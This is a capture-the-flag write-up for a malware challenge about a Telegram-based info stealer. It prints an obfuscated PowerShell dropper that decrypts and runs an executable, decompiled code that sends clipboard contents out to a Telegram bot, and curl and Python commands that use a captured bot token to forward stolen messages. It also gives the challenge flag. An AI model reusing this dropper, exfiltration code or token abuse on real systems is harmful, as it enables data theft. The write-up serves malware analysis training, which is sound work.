# Huntress CTF 2025 - 🐞 Telestealer

**CTF Name:** Huntress CTF 2025
**Challenge name:** 🐞 Telestealer
**Challenge prompt:**
> Our threat intelligence team reported that Ben's data is actively being sold on the dark web. During the incident response, the SOC identified a suspicious JavaScript file within Ben's Downloads folder.
> Can you recover the stolen data?

```
NOTE

The password to the ZIP archive is "telestealer".
```

**Challenge category:** Malware
**Challenge points:** 10

* * *

## Steps to solve

In this challenge, we were given a ZIP file containing some PowerShell code that combines several base64 strings. The initial snippet looks like this:

```powershell
parts.push('JGtleSAgICA9IFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzZZUWJHZU81eU1LaWwxYldnWmI0OTFUTFh2NjhxZFRjNGRCTElJYmR6dz0nKQ0KJGl2ICAgICA9IFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnNWc5WVA0RjBhSGxCWEsrRzNERjVKQT09JykNCiRjaXBoZXIgPSBbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJzRCQTQwaVBBM2dFSFJITGNJN0R5YnZITUpwS28wd3ZYaDMwUlhWVURsU3hHT1NhN2hVNUpIc3NlajljVEt2QVUyWGFsbTI4MW1YQmo5TG4zLzlFckkvMTZpVDFFRWFvdDRJMkU4ejJXR2p0');
```

Using CyberChef, we cleaned the lines by removing `parts.push('` and `');` and base64-decoded the resulting strings. This gave us another payload with PowerShell code containing key parameters for AES decryption:

```powershell
$key    = [Convert]::FromBase64String('36YQbGeO5yMKil1bWgZb491TLXv68qdTc4dBLIIbdzw=')
$iv     = [Convert]::FromBase64String('5g9YP4F0aHlBXK+G3DF5JA==')
$cipher = [Convert]::FromBase64String('4BA40iPA3gEHRHLcI7DybvHMJ....==')
$aes    = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV  = $iv
$dec    = $aes.CreateDecryptor()
$plain  = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)
$out    = 'C:\Users\Public\Music\x.exe'
[IO.File]::WriteAllBytes($out, $plain)
Start-Process -FilePath $out
```

By extracting the base64-encoded cipher and decrypting it in CyberChef with the above key and IV, we obtained an executable file. Running `strings` against the file revealed it to be a .NET application, which the `file` command confirmed: `PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections`.

I transferred the executable to my Windows VM and decompiled it using `dnspy`. The code contained multiple functions related to sending clipboard data and screenshots to a Telegram bot. One notable snippet shows how the bot sends clipboard content:

```powershell
ServicePointManager.Expect100Continue = false;
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
string text4 = string.Concat(new string[]
{
    "https://api.telegram.org/bot",
    UltraSpeed.TG_Access,
    "/sendDocument?chat_id=",
    UltraSpeed.TG_Profileid,
    "&caption=",
    Environment.UserName + " / CLIPBOARD / " + UltraSpeed.INFO_SystemIP().ToString() + "\r\n\r\n\r\n"
});
UltraSpeed.TGMultipart("UserClipboard.txt", "application/x-ms-dos-executable", text4, text3);
```

The challenge name hinted at Telegram usage - `Telestealer` likely refers to data exfiltration via Telegram bots. Researching this, I found a blog post explaining how attackers forward Telegram bot messages to themselves for easy access.

To leverage this, we need the bot token, the bot's chat ID, our chat ID, and the message ID (which is sequential). I tested forwarding messages with `curl`, and after several attempts, the bot forwarded a message to my Telegram client:

```bash
curl -X POST https://api.telegram.org/bot8485770488:AAH8YOjqaRckDPIy7xNwZN2KcaLx6EME-L0/forwardMessage -H "Content-Type: application/json" -d '{"from_chat_id":"-4862820035", "chat_id":"[REDACTED]", "message_id":"4"}'
```

The response was successful and I received the message in Telegram.

To automate the retrieval of all messages, I wrote a Python script to iterate through message IDs and forward them:

```python
import requests

bot_token = "8485770488:AAH8YOjqaRckDPIy7xNwZN2KcaLx6EME-L0"
headers = {"Content-Type": "application/json"}

for i in range(1, 1500):
    data = {
        "from_chat_id": "-4862820035",
        "chat_id": "[REDACTED]",
        "message_id": str(i)
    }
    res = requests.post(f"https://api.telegram.org/bot{bot_token}/forwardMessage", headers=headers, json=data)
    print(f"{i} - {res.text}")
```

After running this, the first message containing the flag appeared at message ID 1020:

```json
1020{"ok":true,"result":{"message_id":2410,[...],"text":"flag{5f5b173825732f5404acf2f680057153}"}}
```

**FLAG:** flag{5f5b173825732f5404acf2f680057153}
